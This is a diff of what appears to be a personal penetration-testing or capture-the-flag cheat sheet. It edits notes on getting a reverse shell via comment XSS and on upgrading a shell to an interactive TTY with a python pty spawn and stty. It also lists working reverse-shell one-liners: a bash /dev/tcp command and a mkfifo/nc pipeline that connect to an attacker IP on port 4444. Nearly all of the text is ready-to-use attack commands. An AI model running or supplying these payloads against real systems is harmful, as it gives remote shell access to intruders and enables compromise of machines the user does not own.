@@ -34,11 +34,11 @@ Getting rev shell when there is a chance to write a comment XSS
 <br />
 <br />
 
-SPAWNING INTTERACTING SHELL:
+SPAWNING INTERACTIVE SHELL:
 
 export TERM=xterm
-which python3 [ Will allow to know what python is installed ]
-python3 -c 'import pty;pty.spawn("/bin/bash")'
+which python3 
+python -c 'import pty;pty.spawn("/bin/bash")'
 press CTRL+Z to bcakground the shell and also run the command on attacker machine
 stty raw -echo ; fg
 reset
@@ -91,7 +91,7 @@ PHP REV SHELL ONE LINER
 
 BASH REV SHELL ONELINER
 
-bash -i >& /dev/tcp/10.2.46.111/4444 0>&1
+bash -i >& /dev/tcp/10.9.170.47/4444 0>&1
  
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.2.46.111 4444 >/tmp/f
 
